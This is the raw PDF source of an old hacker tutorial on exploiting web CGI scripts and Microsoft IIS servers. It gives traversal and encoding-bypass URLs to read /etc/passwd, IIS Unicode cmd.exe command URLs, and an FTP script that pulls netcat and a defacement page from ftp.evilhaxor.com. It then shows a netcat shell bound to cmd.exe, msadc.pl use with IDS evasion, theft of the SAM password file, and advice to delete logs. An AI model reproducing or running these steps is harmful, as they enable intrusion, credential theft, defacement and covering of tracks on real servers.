(http://shells.cyberarmy.com/~johnr/docs/cgi/cgi.txt\n  Perl CGI Problems - ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 776.144 Td
(http://www.phrack.com/phrack/55/P55-07\n\nJust to get you in the mood we will have a brief look at CGI ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 761.971 Td
(exploitation.\nThere are three main types of CGI hacking; URL encoding attacks, input \nvalidation exploits and ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 747.798 Td
(buffer overflows.\n\nThe first thing to keep in mind is that you are already able to exploit cgi \nusing the ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 733.625 Td
(techniques from previous sections. First, we need to cover some \nbackground. CGI can take lots of shapes and ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 719.451 Td
(forms. One popular use is via\nweb based forms that submit information to a CGI via a GET or POST.\n\n  <FORM ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 705.278 Td
(NAME="myform" "METHOD=GET" ACTION="../cgi-bin/my_cgi.cgi">\n\nWhen the user clicks on the submit button his ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 691.105 Td
(information is passed to the \nCGI script to process either via the URL \(GET\) or via HTTP headers \(POST\). \nLets) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 676.932 Td
(assume that the CGI we are going to exploit asks the user for the name \nof a file to display. The 'GET' method) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 662.759 Td
(uses the URL to pass the information \nand it would look like this:\n\n  ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 648.585 Td
(http://www.target.com/cgi-bin/my_cgi.cgi?filename=/etc/passwd\n\nLets break that down:\n\n  ?            - ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 634.412 Td
(separates the request from the parameters\n  filename     - this is the name of the textbox in the html\n  =    ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 620.239 Td
(       - assignment for the parameter/value pair\n  /etc/passwd  - this is what the user typed into the ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 606.066 Td
(box\n\nYou can have multiple fields within a HTML form and these will also be \npassed to the CGI. They are ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 591.892 Td
(separated using a '&':\n\n  http://www.target.com/cgi-bin/my_cgi.cgi?filename=/etc/passwd&user=fugjostle\n\nIf you) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 577.719 Td
(were thinking how could you alter the user supplied input to break \nthe CGI then good, you're starting to ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 563.546 Td
(think in terms of security. Lots of \ndevelopers love to program new and interesting things but they do not ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 549.373 Td
(\nconsider security. A security conscious programmer would write input \nvalidation routines that would process ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 535.199 Td
(the data and ensure the user wasn't \nbe malicious or curious. \n\nAs you read through some of the free scripts ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 521.026 Td
(on the web you will start to \nrealise that many programmers do not think about security. Lets look briefly \nat) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 506.853 Td
(some ways we could exploit the CGI. The first thing to keep in mind is \nthat you already know the generic ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 492.68 Td
(exploits from the previous section. The \nonly area in which we are lacking is programming language specific ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 478.507 Td
(info.\n\nWe will stick with the example cgi that open's a file \(and let's assume \nits written Perl\). Lets look ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 464.333 Td
(at some of the things we can try:\n\n  my_cgi.pl?filename=../../../../../etc/passwd\n\nand lets do the same thing ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 450.16 Td
(but encode the URL to bypass security checks:\n\n  my_cgi.pl?filename=../..%c0%af../..%c0%af../etc/passwd\n\nIf ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 435.987 Td
(you have read the RFP document above then you will be familiar with \npoison null bytes. Stop now and go read ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 421.814 Td
(it... can't be arsed? ok then,  \nhere's the quick version. %00 is valid in a string with Perl but is NUL \nin ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 407.64 Td
(C. So? When Perl wants to open the file it makes a request to the\noperating system through a system call. The ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 393.467 Td
(operating system is written in \nC and %00 is a string delimiter. Lets apply this technique to the \nfollowing ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 379.294 Td
(situation.\n\nI decide to secure my CGI. I append '.html' to any request. This means that \nthe user can only ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 365.121 Td
(view html files and if they try something else then it \ndoesn't exist. wh00p @ me :-\)\n\nBut... what if I was to) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 350.948 Td
(do the following:\n\n  my_cgi.pl?filename=../../../../etc/passwd%00\n\nIn Perl the filename string would look like) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 336.774 Td
(this:\n\n  "../../../../etc/passwd\\0.html"\n\nPerfectly valid under Perl. I have done my job... or have I? When ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 322.601 Td
(this is \npassed to the OS \(which is written in C not Perl\) the request looks like \nthis:\n\n  ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 308.428 Td
("../../../../etc/passwd"\n\nThe OS identifies %00 as the string delimiter and ignores anything that \nComes after) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 294.255 Td
(it. The webserver then displays the /etc/passwd file... bugger :-\(\n\nMany people download scripts from the web ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 280.081 Td
(and look for problems in the \nscript. Then the wiley hax0r will go to altavista and search for sites \nthat are) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 265.908 Td
(using that script, eg:\n\n  url:pollit.cgi\n\nand good old altavista provides a list of sites that are just ripe ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 251.735 Td
(for the \ntaking.\n\nThe final method of exploiting CGI is via buffer overflows. Languages like \nJava and Perl ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 237.562 Td
(are immune to buffer overflows because the language looks \nafter memory management. Programs written in a ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 223.388 Td
(language such as C are \nvulnerable because the programmer is supposed to manage the memory. Some \nprogrammers ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 209.215 Td
(fail to check the size of data it is fitting into the memory \nbuffer and overwrites data in the stack. \n\nThe ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 195.042 Td
(goal of the buffer overflow is to overwrite the instruction pointer\nwhich points to the location of the next ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 180.869 Td
(bit of code to run. An attacker \nwill attempt to overwrite this pointer with a new pointer that points to ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 166.696 Td
(\nattacker's code, usually a root shell.\n\nQuite a few CGI's exist that are vulnerable to this type of attack. ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 152.522 Td
(For \nExample, counter.exe is one such CGI. By writing 2000 A's to the CGI cause\na Denial of Service ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 138.349 Td
(\(DoS\).\n\nThe details of buffer overflows are beyond the scope of this document. \nLook out for a future release ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 124.176 Td
(;-\)\n\nIf you want to dig deeper in buffer overflows then have a look at:\n\n  ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 110.003 Td
(http://www.phrack.com/phrack/49/P49-14\n\n\n--[On the seventh day, God chilled and haxored the planet]\n\nWell.. I ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 95.829 Td
(guess its time we actually tried some of the things discussed but \nI'm not going to cover everything. I ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 81.656 Td
(suggest going to the following URL's \nand searching for IIS:\n\n  http://www.securityfocus.com/\n  ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 67.483 Td
(http://www.packetstormsecurity.com/\n\nMy main reason for doing this file was to better understand Unicode ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 53.31 Td
(exploits \nand so that is going to be the focus of the exploitation. The first exploit \nI'm going to go through) Tj
ET
endstream
endobj
15 0 obj
<<
/Type/Page
/Parent 2 0 R
/MediaBox[ 0 0 595.276 841.89 ]
/Contents 14 0 R
>>
endobj
16 0 obj
<<
/Length 8565
>>
stream
BT
/F0 10 Tf
0 0 0 rg
28.346 804.491 Td
(is the recent Unicode exploit for IIS4/5: \n\n  http://www.securityfocus.com/bid/1806\n\nBefore I get emails ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 790.318 Td
(saying 'hold on, you said that %xx%xx is UTF-8" let me \nexplain. This had wide exposure on Bugtraq as the ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 776.144 Td
(Unicode exploit. In \nreality, this is not a Unicode sploit but a UTF-8 sploit. I'm going to keep \ncalling this) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 761.971 Td
(the Unicode exploit because its now referenced by this name in \nthe Bugtraq archives and you'll have to search) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 747.798 Td
(using Unicode to do further\nresearch.\n\nOk, rant over... To check if the server is exploitable, request the ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 733.625 Td
(\nfollowing URL:\n\n  http://target.com/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir+c:\\\n\nYou should get a ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 719.451 Td
(directory listing of the C:\\ drive on the target server. \nThe important thing to note is that the Unicode ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 705.278 Td
(string can vary depending \nwhere in the world you are. Some possible alternatives include:\n\n  %c1%1c %c0%9v ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 691.105 Td
(%c0%af %c0%qf %c1%8s %c1%9c %c1%pc \n\nThere are many more to choose from, just look at some of the Bugtraq ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 676.932 Td
(posts or \nresearch UTF-8 for more alternatives.\n\nOK, you can read the directory... what next? You have the ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 662.759 Td
(directory listing \nand the ability to run commands, so you need to find the web root. By default, \nthe web ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 648.585 Td
(root is at:\n\n  c:\\inetpub\\wwwroot\\\n\nIf its not there then go and look for it. Let's write a text file there ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 634.412 Td
(and \nsee if we can see it:\n\n  cmd.exe?/c+echo+owned+>+c:\\inetpub\\wwwroot\\test.txt\n\nhmmm.. it seems that we ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 620.239 Td
(don't have write access. Ok, no problem we can get \naround that by creating a copy of the cmd.exe that has ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 606.066 Td
(write privileges:\n\n  cmd.exe?/c+copy+c:\\winnt\\system32\\cmd.exe+c:\\winnt\\system32\\fug.exe\n\nLet's check if it ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 591.892 Td
(worked:\n\n  http://target.com/scripts/..%c0%af../winnt/system32/fug.exe?/c+dir+c:\\\n\nYep.. all's good so far. ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 577.719 Td
(Lets try and write to the web root:\n\n  fug.exe?/c+echo+owned+>+c:\\inetpub\\wwwroot\\test.txt\n\nLet's open up it ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 563.546 Td
(up in the browser and see if we can see it:\n\n  http://target.com/test.txt\n\nw00t!!! Write access!!! Right, we ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 549.373 Td
(now have some options open to us. In the \nwords of Microsoft, where do you want to go today? Working via the ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 535.199 Td
(URL is \npretty clunky and I like the comfort of a nice command prompt, So lets do \nthat. I want to bring over ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 521.026 Td
(a copy of netcat and a nice html page that I'll \nuse to replace the existing one.\n\nFirst I need to think about) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 506.853 Td
(the script I want to run that will get the \nfiles I need from my FTP server:\n\n fugscript:\n  open ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 492.68 Td
(ftp.evilhaxor.com\n  anonymous\n  anon@microsoft.com\n  cd pub\n  get nc.exe\n  get hacked.html\n  quit\n\nRight. I ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 478.507 Td
(need to get this script onto the webserver:\n\n  fug.exe?/c+echo%20open%20ftp.evilhaxor.com>fugscript\n  ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 464.333 Td
(fug.exe?/c+echo%20anonymous>>fugscript\n  fug.exe?/c+echo%20anon@microsoft.com>>fugscript\n  ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 450.16 Td
(fug.exe?/c+echo%20cd%20pub>>fugscript\n  fug.exe?/c+echo%20get%20nc.exe>>fugscript\n  ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 435.987 Td
(fug.exe?/c+echo%20get%20hacked.html>>fugscript\n  fug.exe?/c+echo%20quit>>fugscript\n\nOK.. now we have created a) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 421.814 Td
(script on the server called fugscript. Next step \nis to execute the script and get my files from my web ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 407.64 Td
(server.\n\n  fug.exe?/c+ftp%20-s:fugscript\n\nIf all goes well the server should begin the FTP transfer and get ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 393.467 Td
(your files \ntransferred. Be patient and give it time to transfer. Now you are ready to \nget netcat listening ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 379.294 Td
(on a port. The command line for starting netcat is:\n\n  nc.exe -l -p 6667 -e cmd.exe\n\nThis tells netcat to ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 365.121 Td
(listen \(-l\) on port 6667 \(-p\) and to spawn cmd.exe \(-e\) \nwhen someone connects. The last step is to translate ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 350.948 Td
(this command into URL \nspeak ;-\):\n\n  fug.exe?/c+nc.exe%20-l%20-p%206667%20-e%20cmd.exe\n\nFire up a telnet ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 336.774 Td
(session and connect to port 6667 on the target system and \nvoila... you have a cmd prompt. I really hate web ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 322.601 Td
(defacements... so if your \ngoing to do it then rename the existing index.htm \(or default.htm\) to \nsomething ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 308.428 Td
(like index.htm.old \(give the poor admin a break, cause you can bet\nyour arse that he hasn't made a backup\). ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 294.255 Td
(ALSO: you are now using a system \nwithout authorisation and as such, you are guilty under the Computer Misuse ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 280.081 Td
(\nAct in the UK and probably of something similar in your own country. If it \nnever occurred to you to delete ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 265.908 Td
(the contents of c:\\winnt\\system32\\logfiles \nor the 'fugscript' file then you really shouldn't be doing ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 251.735 Td
(this.\n\n\n\nIt just wouldn't be right to talk about IIS exploitation without mentioning \nmsadc.pl. rfp's perl ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 237.562 Td
(script is a perfect example of exploit chaining. A \nsingle exploit is not used but a chain of exploits to get ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 223.388 Td
(the script to \nwork.\n\nThe exploit utilises a combination of inadequate application input validation \nand ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 209.215 Td
(default install fun. The process tries to connect to a Data Source Name \n\(DSN\) to execute commands.\n\nrfp's ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 195.042 Td
(script tests for the existence /msadc/msadc.dll using the GET method. \nThis test will be logged and you should) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 180.869 Td
(edit the script to make it a HEAD \nrequest and add some URL obfuscation madness. \n\nThe default msadc.pl script) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 166.696 Td
(uses "!ADM!ROX!YOUR!WORLD!" as the MIME \nseparator string. It is advised to change this string as some IDS's ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 152.522 Td
(are \nconfigured to identify this string.\n\nIf you want to write your own scanners then you should be looking ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 138.349 Td
(for \nheaders with the content type:\n\n  application/x-varg\n\nand of course the IIS version :-\) I don't want to ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 124.176 Td
(go into too much detail \nbecause this is heavily documented on rfp's site:\n\n  ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 110.003 Td
(http://www.wiretrip.net/rfp/\n\nHow do I use it? I hear you cry... well, its child's play:\n\n  ./msadc2.pl -h ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 95.829 Td
(www.target.com\n\nIf all goes well then you should be presented with the following:\n\n  command:\n\nIts interesting) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 81.656 Td
(to note at this point that 'cmd /c' will is run as with the\nprevious exploit. You can edit the script to run ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 67.483 Td
(any other executable such \nas 'rdsik /s' instead.\n\nThis is good, you can know enter the command you want to ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 53.31 Td
(run on the server. \nThe previous Unicode exploit should have given you some ideas but here's a \ncouple that ) Tj
ET
endstream
endobj
17 0 obj
<<
/Type/Page
/Parent 2 0 R
/MediaBox[ 0 0 595.276 841.89 ]
/Contents 16 0 R
>>
endobj
18 0 obj
<<
/Length 1597
>>
stream
BT
/F0 10 Tf
0 0 0 rg
28.346 804.491 Td
(come to mind:\n\n  Example 1:\n  copy c:\\winnt\\repair\\sam._ c:\\inetpub\\wwwroot\\fug.hak\n\n  \(grabbing fug.hak via ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 790.318 Td
(your browser should give you a nice file to fire up \n   in L0phtcrack or JTR\)\n\n  Example 2:\n  echo open ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 776.144 Td
(ftp.evilhaxor.com>fugscript && echo fug>>fugscript\n  && echo mypassword>>fugscript... etc. etc.\n  \nAnyway, ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 761.971 Td
(that's about all for now. When I can be bothered I'll add some more \nmethods to this file. Until then, ensure ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 747.798 Td
(your box is fully patched and the \ndefault scripts are removed. Go have a look at the following URL and get ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 733.625 Td
(\nsecure:\n\n  ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 719.451 Td
(http://www.microsoft.com/security/\n\n**************************************************************************) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 705.278 Td
(*\nGreetz to: ReDeeMeR, BarnseyBoy, Reeferman, gabbana, think12, Wang, Enstyne, \n           [502BOP], Muad_Dib,) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 691.105 Td
(Macster, n0face, palmito, kph, Homicide, Col, \n           Axem, Booto, _Penguin, nsh, Chawmp, shad, hellz and ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 676.932 Td
(everyone in \n           #CA who are way too numerous to ) Tj
ET
BT
/F0 10 Tf
0 0 0 rg
28.346 662.759 Td
(mention.\n***************************************************************************\n\n\n) Tj
ET
endstream
endobj
19 0 obj
<<
/Type/Page
/Parent 2 0 R
/MediaBox[ 0 0 595.276 841.89 ]
/Contents 18 0 R
>>
endobj
20 0 obj
<<
/Type/Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type/Pages
/Kids[
9 0 R
11 0 R
13 0 R
15 0 R
17 0 R
19 0 R
]
/Count 6
/Resources 3 0 R
>>
endobj
3 0 obj
<<
/ProcSet[/PDF/Text/ImageC]
/Font<<
/F0 7 0 R
>>
>>
endobj
xref
0 21
0000000000 65535 f
0000000009 00000 n
0000045937 00000 n
0000046046 00000 n
0000000168 00000 n
0000000168 00000 n
0000001113 00000 n
0000001256 00000 n
0000001421 00000 n
0000009461 00000 n
0000009555 00000 n
0000018077 00000 n
0000018173 00000 n
0000026717 00000 n
0000026813 00000 n
0000035334 00000 n
0000035430 00000 n
0000044047 00000 n
0000044143 00000 n
0000045792 00000 n
0000045888 00000 n
trailer
<<
/Size 21
/Root 20 0 R
/Info 1 0 R
/ID[(424044341ttueoIEltif)(424044341ttueoIEltif)]
>>
startxref
46115
%%EOF
